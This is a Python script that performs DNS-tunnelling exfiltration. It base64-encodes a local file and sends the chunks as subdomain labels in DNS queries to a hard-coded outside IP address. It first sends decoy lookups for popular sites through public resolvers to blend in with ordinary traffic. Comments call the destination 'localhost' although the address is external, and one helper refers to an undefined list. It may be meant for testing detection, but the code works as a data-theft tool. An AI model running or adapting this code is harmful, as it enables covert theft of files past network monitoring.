import socket
import random
import time
import base64
import struct

# ==========================================================
# Configuration
# ==========================================================

GOOGLE_DNS = "8.8.8.8"
CLOUDFLARE_DNS = "1.1.1.1"
LOCAL_DNS = "103.165.206.238"
DNS_PORT = 53

RUN_TIME = 5 * 60                 # 5 minutes
LOCAL_QUERIES_PER_MIN = 5         # Send data 5 times every minute
DATA_FILE = "data.txt"

# Maximum DNS label length
DNS_LABEL_SIZE = 63


# ==========================================================
# DNS Packet Builder
# ==========================================================

def encode_dns_name(name):
    """Convert a domain name into DNS wire format."""

    packet = b""

    for label in name.split("."):
        packet += bytes([len(label)])
        packet += label.encode()

    packet += b"\x00"

    return packet


def build_dns_query(domain, qtype=1):
    """
    qtype:
        1 = A
        15 = MX
        16 = TXT
    """

    transaction_id = random.randint(0, 65535)

    header = struct.pack(
        "!HHHHHH",
        transaction_id,
        0x0100,      # Standard Query
        1,           # Questions
        0,
        0,
        0
    )

    question = (
        encode_dns_name(domain) +
        struct.pack("!H", qtype) +
        struct.pack("!H", 1)
    )

    return header + question


# ==========================================================
# DNS Sender
# ==========================================================

def send_dns_query(server, domain, qtype=1):

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    try:

        packet = build_dns_query(domain, qtype)

        sock.sendto(packet, (server, DNS_PORT))

        try:
            sock.recvfrom(4096)
        except socket.timeout:
            pass

    finally:
        sock.close()


# ==========================================================
# Read File and Base64 Encode
# ==========================================================

def load_base64_chunks(filename):

    with open(filename, "rb") as f:
        data = f.read()

    encoded = base64.urlsafe_b64encode(data).decode()

    encoded = encoded.rstrip("=")

    chunks = []

    for i in range(0, len(encoded), DNS_LABEL_SIZE):
        chunks.append(encoded[i:i + DNS_LABEL_SIZE])

    return chunks


# ==========================================================
# Generate Normal DNS Traffic
# ==========================================================

def generate_normal_dns():

    resolver = random.choice([GOOGLE_DNS, CLOUDFLARE_DNS])

    domain = random.choice(COMMON_DOMAINS)

    try:

        send_dns_query(resolver, domain)

        print(f"[NORMAL] {resolver:8} -> {domain}")

    except Exception as e:

        print(f"[ERROR] {e}")


# ==========================================================
# Send Base64 Chunks to Localhost
# ==========================================================

def send_localhost_chunks(chunks):

    print("\n==============================")
    print("Sending encoded file to localhost")
    print("==============================")

    for chunk in chunks:

        domain = f"{chunk}.alpha.testdomain.com"

        try:

            send_dns_query(
                LOCAL_DNS,
                domain,
                qtype=1        # Change to 15 for MX if desired
            )

            print("[LOCAL]", domain)

        except Exception as e:

            print("[ERROR]", e)

        time.sleep(0.2)


# ==========================================================
# Main
# ==========================================================
def main():

    print("=" * 60)
    print("Loading file...")
    print("=" * 60)

    try:
        chunks = load_base64_chunks(DATA_FILE)
    except FileNotFoundError:
        print(f"File '{DATA_FILE}' not found.")
        return

    print(f"Loaded {len(chunks)} DNS chunks.\n")

    #
    # Generate legitimate DNS traffic
    #
    legitimate_domains = [
        "google.com",
        "chatgpt.com",
        "amazon.com",
        "perplexity.ai",
        "attack.mitre.org",
    ]

    print("Generating legitimate DNS traffic...\n")

    for domain in legitimate_domains:

        resolver = random.choice([GOOGLE_DNS, CLOUDFLARE_DNS])

        try:
            send_dns_query(resolver, domain)
            print(f"[NORMAL] {resolver} -> {domain}")
        except Exception as e:
            print(e)

        time.sleep(random.uniform(1, 3))

    #
    # Send encoded file once
    #
    print("\nSending encoded file...\n")

    for chunk in chunks:

        domain = f"{chunk}.alpha.testdomain.com"

        try:
            send_dns_query(
                LOCAL_DNS,
                domain,
                qtype=1
            )

            print("[LOCAL]", domain)

        except Exception as e:
            print(e)

        time.sleep(0.2)

    print("\nFinished.")

if __name__ == "__main__":
    main()
